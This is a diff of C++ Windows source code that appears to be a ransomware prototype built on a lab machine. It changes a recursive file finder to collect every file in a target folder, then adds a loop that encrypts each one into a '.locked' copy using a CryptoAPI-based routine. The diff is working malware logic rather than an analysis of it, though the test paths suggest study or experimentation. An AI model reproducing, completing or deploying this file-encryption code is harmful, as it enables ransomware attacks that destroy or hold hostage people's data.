@@ -5,7 +5,7 @@
 #include <queue>
 #include <Shlwapi.h>
 #include <tchar.h>
-
+#include <wchar.h>
 #include <Windows.h>
 #include <wincrypt.h>
 
@@ -104,11 +104,11 @@ void encryptFile(const wchar_t* filename, const wchar_t* filename2, bool isDecry
     const size_t len = lstrlenW(key_str);
     const size_t key_size = len * sizeof(key_str[0]); // size in bytes
 
-    std::cout << "Key: %S\n" <<  key_str << std::endl;
-    std::cout << "Key len: %#x\n" << len << std::endl;
-    std::cout << "Key size: %#x\n" << key_size << std::endl;
-    std::cout << "Input File: %S\n" << filename << std::endl;
-    std::cout << "Output File: %S\n" << filename2 << std::endl;
+    std::cout << "Key: " <<  key_str << std::endl;
+    std::cout << "Key len: " << len << std::endl;
+    std::cout << "Key size: " << key_size << std::endl;
+    std::wcout << "Input File: " << filename << std::endl;
+    wcout << "Output File: " << filename2 << std::endl;
     std::cout << "----\n";
 
     HANDLE hInpFile = CreateFileW(filename, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, NULL);
@@ -268,10 +268,11 @@ void FindFile(const std::wstring& directory, wstring ext, queue<wstring> &result
             }
 
             tmp = directory + L"\\" + std::wstring(file.cFileName);
-            if (PathMatchSpecW(file.cFileName, ext.c_str())) {
+            wcout << tmp << endl;
+            if (!(file.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) && PathMatchSpecW(file.cFileName, ext.c_str())) {
+                //wcout << "pushed " << tmp.c_str() << endl;
                 results.push(tmp);
             }
-            //std::wcout << tmp << std::endl;
 
             if (file.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
                 directories.push_back(tmp);
@@ -281,6 +282,8 @@ void FindFile(const std::wstring& directory, wstring ext, queue<wstring> &result
 
         for (std::vector<std::wstring>::iterator iter = directories.begin(), end = directories.end(); iter != end; ++iter)
             FindFile(*iter, ext, results);
+
+        //std::wcout << tmp << std::endl;
     }
 }
 //params: <input file> <output file> <is decrypt mode> <key>
@@ -295,30 +298,24 @@ int wmain(int argc, wchar_t* argv[])
 
     const wchar_t* filename = L"c:\\users\\vagrant\\Desktop\\important.txt";
     const wchar_t* filename2 = L"c:\\users\\vagrant\\Desktop\\important.locked";
-    encryptFile(filename2, filename, TRUE);
 
-    std::string directoryPath = "c:\\users\\vagrant\\Desktop\\*";
-
-    // we should create a queue of paths of files found on the system (maybe not all paths... just some, or some 
-    // files with particular extension
-    int count = 0;
-    /*
-    int status = EnumerateFiles(
-        directoryPath,
-        [&count](const auto& file) {
-            std::cout << " => " << file << "\n";
-            std::cout << "executed" << std::endl;
-
-            if (count++ < 50)
-                return true;
-            else
-                return false;
-        });*/
-
-    wstring directoryPath2 = L"c:\\users\\vagrant\\Desktop\\";
+    wstring directoryPath2 = L"C:\\Users\\vagrant\\Desktop\\testransom";
     queue<wstring> results;
     // TODO: list of extensions
-    FindFile(directoryPath2, L"*.ps1", results);
+    FindFile(directoryPath2, L"", results);
+
+    wstring el;
+    cout << "popping" << endl;
+    while (results.size()) {
+        el = results.front();
+
+        wcout << "ciphering " << el.c_str() << endl;
+        wcout << "ciphering " << (el + L".locked").c_str() << endl;
+        encryptFile(el.c_str(), (el + L".locked").c_str(), false);
+
+        results.pop();
+        wcout << el << endl;
+    }
 
     cout << "queue ready" << endl;
     cout << "number of el " << results.size() << endl;
